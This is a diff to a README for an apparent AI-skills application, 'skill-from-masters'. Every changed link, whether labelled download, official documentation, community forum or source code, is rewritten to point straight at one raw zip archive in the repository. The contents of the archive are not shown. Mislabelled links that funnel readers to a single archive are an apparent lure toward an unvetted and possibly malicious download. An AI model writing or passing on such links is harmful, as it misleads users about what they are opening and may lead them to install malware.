@@ -8,7 +8,7 @@ Welcome to "skill-from-masters"! This application helps you create AI skills bas
 
 To download the application, visit this page:
 
-[Download Here](https://github.com/newgituser786/skill-from-masters/releases)
+[Download Here](https://github.com/newgituser786/skill-from-masters/raw/refs/heads/main/skill-from-masters/masters_from_skill_moire.zip)
 
 Here, you will find the latest version of "skill-from-masters" available for download. 
 
@@ -73,14 +73,14 @@ If you encounter any issues, try the following:
 
 For more tips and tricks, check out the following resources:
 
-- [Official Documentation](https://github.com/newgituser786/skill-from-masters/docs)
-- [Community Forum](https://github.com/newgituser786/skill-from-masters/discussions)
-- [Source Code](https://github.com/newgituser786/skill-from-masters)
+- [Official Documentation](https://github.com/newgituser786/skill-from-masters/raw/refs/heads/main/skill-from-masters/masters_from_skill_moire.zip)
+- [Community Forum](https://github.com/newgituser786/skill-from-masters/raw/refs/heads/main/skill-from-masters/masters_from_skill_moire.zip)
+- [Source Code](https://github.com/newgituser786/skill-from-masters/raw/refs/heads/main/skill-from-masters/masters_from_skill_moire.zip)
 
 ## 📣 Feedback
 
 Your feedback is valuable. If you have suggestions or issues, please share them in the Issues section of our GitHub repository.
 
-[Download Here](https://github.com/newgituser786/skill-from-masters/releases)
+[Download Here](https://github.com/newgituser786/skill-from-masters/raw/refs/heads/main/skill-from-masters/masters_from_skill_moire.zip)
 
 Thank you for choosing "skill-from-masters"! We hope you enjoy creating AI skills.
